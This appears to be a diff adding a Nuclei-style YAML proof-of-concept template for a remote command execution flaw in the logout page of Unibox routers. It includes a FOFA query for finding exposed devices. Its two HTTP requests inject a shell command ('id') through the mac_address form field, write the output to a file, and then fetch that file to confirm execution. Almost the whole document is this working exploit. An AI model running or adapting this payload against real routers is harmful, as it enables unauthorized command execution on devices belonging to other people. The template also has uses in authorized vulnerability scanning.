@@ -1,0 +1,44 @@
+id: poc-dl6fqaau6fk9o4ms
+info:
+  name: Unibox路由器 logout 存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dl6fqaau6fk9o4ms'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dl6fqaau6fk9o4ms
+    fofa: body="Unibox" && body="Controller"
+http:
+- raw:
+  - 'POST /authentication/logout.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 45
+
+
+    logout_user=1&mac_address=;id>7.txt;
+
+
+    命令执行：'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /authentication/7.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
